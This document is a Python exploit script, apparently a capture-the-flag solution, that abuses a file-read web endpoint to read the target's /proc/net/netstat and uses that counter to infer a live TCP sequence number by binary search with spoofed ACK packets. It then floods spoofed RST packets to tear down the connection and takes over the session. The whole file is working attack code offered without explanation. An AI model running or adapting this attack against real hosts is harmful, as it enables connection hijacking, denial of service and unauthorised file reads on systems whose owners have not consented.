from scapy.all import *
import requests
from socket import *


def send_ack(seq):
    TCPLayer = TCP(sport=21587, dport=7775, flags='A', seq=seq, ack=3521354383)
    IPLayer = IP(src='172.21.0.2',dst='172.21.0.3')
    data = 'flag'
    pkt = IPLayer/TCPLayer/data
    send(pkt, verbose=0)


def send_bye(seq):
    TCPLayer = TCP(sport=7775, dport=21587, flags='A', seq=seq, ack=3521354383)
    IPLayer = IP(src='172.21.0.3',dst='172.21.0.2')
    data = 'flag'
    pkt = IPLayer/TCPLayer/data
    send(pkt, verbose=0)


def get_num():
    url = 'http://172.21.0.3:5000/file?name=/proc/net/netstat'
    r = requests.get(url=url)
    data = r.text.split('\n')[1]
    num = data.split(' ')[19]
    return num


def send_rst(seq):
    TCPLayer = TCP(sport=21587, dport=7775, flags='R', seq=seq, ack=3521354383)
    IPLayer = IP(src='172.21.0.2', dst='172.21.0.3')
    data = 'flag'
    pkt = IPLayer / TCPLayer / data
    send(pkt, verbose=0)


def connect():
    HOST = '172.21.0.2'
    PORT = 21587
    BUFSIZ = 1024
    ADDR = (HOST, PORT)

    tcp_socket = socket(AF_INET, SOCK_STREAM)
    tcp_socket.connect(ADDR)
    data = '*ctf'
    tcp_socket.send(data.encode())
    resp = tcp_socket.recv(BUFSIZ)
    if resp:
        print(resp.decode('utf-8'))

    tcp_socket.close()

min = 0
max = 4294967296
a = int(get_num())

while abs(max - min) > 1:
    mid = (max + min) // 2
    send_ack(mid)
    num = int(get_num())

    if num - a == 1:
        min = mid
        a = num
    else:
        max = mid

ans = max

# start to rst attack
for i in range(ans - 30, ans + 30):
    send_rst(i)

# start connect to server
send_bye(ans)
connect()